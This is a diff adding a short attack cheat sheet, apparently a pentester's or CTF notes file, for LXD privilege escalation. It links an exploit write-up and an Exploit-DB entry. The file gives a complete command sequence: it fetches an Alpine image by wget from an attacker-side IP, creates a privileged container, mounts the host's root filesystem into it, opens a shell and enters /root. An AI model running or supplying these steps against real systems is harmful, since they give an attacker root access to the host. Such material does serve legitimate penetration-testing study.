@@ -1,0 +1,15 @@
+### LXD ###
+https://www.hackingarticles.in/lxd-privilege-escalation/
+https://www.exploit-db.com/exploits/46978
+
+lxc list
+wget http://10.8.98.114/alpine-v3.12-x86_64-20200901_1157.tar.gz
+lxc image import ./alpine-v3.12-x86_64-20200901_1157.tar.gz --alias myimage
+lxc image list
+lxc init myimage ignite -c security.privileged=true
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
+lxc start ignite
+lxc exec ignite /bin/sh
+id
+cd /mnt/root/root
+
